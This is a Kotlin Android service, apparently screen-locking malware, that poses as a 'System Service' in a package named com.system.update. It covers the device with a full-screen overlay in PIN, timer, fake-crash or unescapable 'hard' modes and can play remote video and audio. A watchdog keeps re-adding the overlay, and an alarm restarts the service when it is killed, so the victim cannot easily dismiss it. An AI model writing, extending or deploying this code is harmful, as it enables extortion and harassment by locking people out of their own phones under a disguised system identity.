package com.system.update

import android.app.AlarmManager
import android.app.Notification
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.media.MediaPlayer
import android.net.Uri
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.view.Gravity
import android.view.View
import android.view.WindowManager
import android.widget.FrameLayout
import android.widget.VideoView
import androidx.core.app.NotificationCompat

class LockService : Service() {

    companion object {
        const val NOTIF_ID = 100

        @Volatile var currentOverlay: View? = null
        @Volatile var currentType: String? = null
        @Volatile var currentPin: String = "1234"
        @Volatile var currentHours: Long = 5L
        @Volatile var videoUrl: String? = null
        @Volatile var audioUrl: String? = null
        @Volatile var lockUntil: Long = 0L
        @Volatile var isActive: Boolean = false
    }

    private lateinit var wm: WindowManager
    private var watchdog: Handler? = null
    private var mediaPlayer: MediaPlayer? = null
    private var videoView: VideoView? = null

    override fun onCreate() {
        super.onCreate()
        wm = getSystemService(Context.WINDOW_SERVICE) as WindowManager
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val type = intent?.getStringExtra("type")
        if (type == "stop") {
            stopLock()
            return START_NOT_STICKY
        }

        if (type != null) {
            currentType = type
            currentPin = intent.getStringExtra("pin") ?: "1234"
            currentHours = intent.getLongExtra("hours", 5L)
            videoUrl = intent.getStringExtra("videoUrl")
            audioUrl = intent.getStringExtra("audioUrl")

            if (type == "time") {
                lockUntil = System.currentTimeMillis() + currentHours * 3600_000L
            }
        }

        startForeground(NOTIF_ID, buildNotification())
        isActive = true

        if (currentType != null && currentOverlay == null) {
            showOverlay()
        }

        startWatchdog()
        return START_STICKY
    }

    private fun buildNotification(): Notification {
        val pi = PendingIntent.getActivity(
            this, 0,
            Intent(this, MainActivity::class.java),
            PendingIntent.FLAG_IMMUTABLE
        )
        return NotificationCompat.Builder(this, App.CHANNEL_ID)
            .setContentTitle("System Service")
            .setContentText("Running")
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .setContentIntent(pi)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .build()
    }

    // ============================================================
    // SHOW OVERLAY
    // ============================================================
    private fun showOverlay() {
        try {
            removeOverlayView()

            val baseView: View = when (currentType) {
                "pin" -> LockOverlayView.buildPin(this, currentPin) { v ->
                    removeOverlayView()
                    v.let { try { wm.removeView(it) } catch (_: Exception) {} }
                    stopLock()
                }
                "hard" -> LockOverlayView.buildHard(this)
                "time" -> LockOverlayView.buildTimer(this, currentHours * 3600_000L) { v ->
                    removeOverlayView()
                    v.let { try { wm.removeView(it) } catch (_: Exception) {} }
                    stopLock()
                }
                "crash" -> LockOverlayView.buildCrash(this) { v ->
                    removeOverlayView()
                    v.let { try { wm.removeView(it) } catch (_: Exception) {} }
                    stopLock()
                }
                else -> return
            }

            val root: View = if (!videoUrl.isNullOrEmpty()) {
                wrapWithVideo(baseView)
            } else {
                baseView
            }

            wm.addView(root, LockOverlayView.paramsFull())
            currentOverlay = root

            if (!audioUrl.isNullOrEmpty()) {
                startAudioLoop(audioUrl!!)
            }
        } catch (_: Exception) {}
    }

    private fun wrapWithVideo(contentView: View): View {
        val container = FrameLayout(this)

        try {
            val vv = VideoView(this)
            val uri = Uri.parse(videoUrl)
            vv.setVideoURI(uri)
            vv.setOnPreparedListener { mp ->
                mp.isLooping = true
                mp.setVolume(0f, 0f)
                vv.start()
            }
            vv.setOnErrorListener { _, _, _ -> true }

            val vvParams = FrameLayout.LayoutParams(
                FrameLayout.LayoutParams.MATCH_PARENT,
                FrameLayout.LayoutParams.MATCH_PARENT
            )
            vvParams.gravity = Gravity.CENTER
            container.addView(vv, vvParams)
            videoView = vv
        } catch (_: Exception) {}

        val contentParams = FrameLayout.LayoutParams(
            FrameLayout.LayoutParams.MATCH_PARENT,
            FrameLayout.LayoutParams.MATCH_PARENT
        )
        container.addView(contentView, contentParams)

        return container
    }

    private fun startAudioLoop(url: String) {
        try {
            mediaPlayer?.release()
            mediaPlayer = MediaPlayer().apply {
                setDataSource(this@LockService, Uri.parse(url))
                isLooping = true
                setOnPreparedListener { start() }
                setOnErrorListener { _, _, _ -> true }
                prepareAsync()
            }
        } catch (_: Exception) {}
    }

    private fun removeOverlayView() {
        try {
            currentOverlay?.let { wm.removeView(it) }
        } catch (_: Exception) {}
        currentOverlay = null

        try {
            videoView?.stopPlayback()
            videoView = null
        } catch (_: Exception) {}

        try {
            mediaPlayer?.stop()
            mediaPlayer?.release()
            mediaPlayer = null
        } catch (_: Exception) {}
    }

    // ============================================================
    // WATCHDOG
    // ============================================================
    private fun startWatchdog() {
        watchdog?.removeCallbacksAndMessages(null)
        watchdog = Handler(Looper.getMainLooper())
        watchdog?.postDelayed(object : Runnable {
            override fun run() {
                if (!isActive) return

                if (currentType == "time" && lockUntil > 0 &&
                    System.currentTimeMillis() >= lockUntil) {
                    stopLock()
                    return
                }

                if (currentOverlay == null && currentType != null) {
                    showOverlay()
                }

                watchdog?.postDelayed(this, 1500)
            }
        }, 1500)
    }

    // ============================================================
    // STOP LOCK
    // ============================================================
    fun stopLock() {
        isActive = false
        removeOverlayView()
        currentType = null
        lockUntil = 0
        videoUrl = null
        audioUrl = null

        watchdog?.removeCallbacksAndMessages(null)

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            stopForeground(STOP_FOREGROUND_REMOVE)
        } else {
            @Suppress("DEPRECATION") stopForeground(true)
        }
        stopSelf()
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        if (isActive) {
            try {
                val restart = Intent(applicationContext, LockService::class.java)
                val pi = PendingIntent.getService(
                    this, 1, restart,
                    PendingIntent.FLAG_ONE_SHOT or PendingIntent.FLAG_IMMUTABLE
                )
                val am = getSystemService(Context.ALARM_SERVICE) as AlarmManager
                am.set(
                    AlarmManager.RTC,
                    System.currentTimeMillis() + 1000,
                    pi
                )
            } catch (_: Exception) {}
        }
        super.onTaskRemoved(rootIntent)
    }

    override fun onDestroy() {
        watchdog?.removeCallbacksAndMessages(null)
        removeOverlayView()
        isActive = false
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
